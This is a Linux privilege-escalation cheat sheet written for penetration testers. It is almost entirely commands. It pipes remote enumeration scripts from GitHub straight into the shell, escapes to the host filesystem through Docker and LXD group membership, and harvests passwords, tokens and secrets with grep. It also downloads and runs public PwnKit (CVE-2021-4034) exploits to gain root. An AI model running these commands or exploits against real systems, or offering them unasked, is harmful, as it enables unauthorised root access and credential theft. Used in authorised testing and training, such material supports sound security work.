# Linux Privilege Escalation

## Tools

#### [LinPEAS](https://github.com/peass-ng/PEASS-ng)

```bash
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

#### [LSE](https://github.com/diego-treitos/linux-smart-enumeration)

```bash
curl -sL https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | bash
```

#### [LinEnum](https://github.com/rebootuser/LinEnum)

```bash
curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

## System Info

Obtain information about the system **architecture, distribution, and kernel version**.

```bash
uname -a  # System information
lsb_release -a  # Distribution information
getconf LONG_BIT  # System architecture
cat /proc/version  # Kernel version
cat /etc/os-release  # OS details
```

## Path

Check if you have **write permissions** for any directory in the PATH.

```bash
echo $PATH | tr ':' '\n' | sort -u | xargs -I{} bash -c 'if [ -w "{}" ]; then echo "[+] {}"; fi'
```

## Enviroment Variables

Sometimes we can find password or sensitive information in enviroment variables.

```bash
env  # Environment variables
set  # Shell variables
```

## Groups

List all the groups users belongs to.

```bash
id [user]
groups [user]
```

### Docker

If you belong to the **Docker group**, you could **mount the filesystem** within a container and have full access to it, allowing you to modify it.

```bash
docker run -it --rm -v /:/mnt alpine chroot /mnt sh
```

### LXD/LXC

Similar to Docker, with **LXD/LXC**, we can also **mount the filesystem** within a container, granting full access to it.

{% code overflow="wrap" %}
```bash
# On your machine, download and build an alpine image and transfer it to the host
git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && sudo ./build-alpine
```
{% endcode %}

```bash
# Import the image
lxc image import ./alpine.tar.gz --alias privimg
# Create the containter
lxc init privimg privcont -c security.privileged=true
# Mount the filesystem
lxc config device add privcont privdev disk source=/ path=/mnt/root recursive=true
# Start the container
lxc start privcont
# Interactive shell
lxc exec privcont /bin/sh
```

## Sudo

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
# List user privileges
sudo -l
# Version
sudo -V | grep "Sudo ver"
```

## Capabilities <a href="#capabilities" id="capabilities"></a>

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

```bash
getcap -r / 2>/dev/null
```

## SUID

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

## Open Ports

```bash
ss -nltp
netstat -punta
```

## Cron Jobs

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs)

```bash
crontab -l
find / -name "cron*" 2>/dev/null
ls -l /var/log/syslog
ls -l /var/log/cron
```

## Process Monitor

{% hint style="info" %}
You can add words to the blacklist on the `grep -Ev` section.
{% endhint %}

```bash
old_ps=$(ps -eo user,command); while true; do new_ps=$(ps -eo user,command); \
diff <(echo "$old_ps") <(echo "$new_ps") | grep "[\>\<]" | \
grep -Ev "kworker|user,command"; old_ps=$new_ps; done
```

## Writable Scripts

```bash
find / -user <USER> -writable \( -name "*.sh" -o -name "*.py" \) -type f 2>/dev/null
```

## Passwords

```bash
grep -Eriao --color=always '(password|passwd|pass|pwd|key|secret|token)[[:space:]]*[:=][[:space:]]*[^[:space:]]{6,}' . | awk '{ line = $0; sub(/^[^:]*:[^:]*:/, "", line); if (!seen[line]++) print $0; }'
```

## Exploits

### Polkit - (CVE-2021-4034)

[https://github.com/Almorabea/pkexec-exploit/tree/main](https://github.com/ly4k/PwnKit/tree/main)

```bash
curl -sL https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-2021-4034.py \
-o PwnKit.py && python3 PwnKit.py
```

[https://github.com/ly4k/PwnKit/tree/main](https://github.com/ly4k/PwnKit/tree/main)

```bash
curl -sL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit \
-o PwnKit && chmod +x PwnKit && ./PwnKit
```
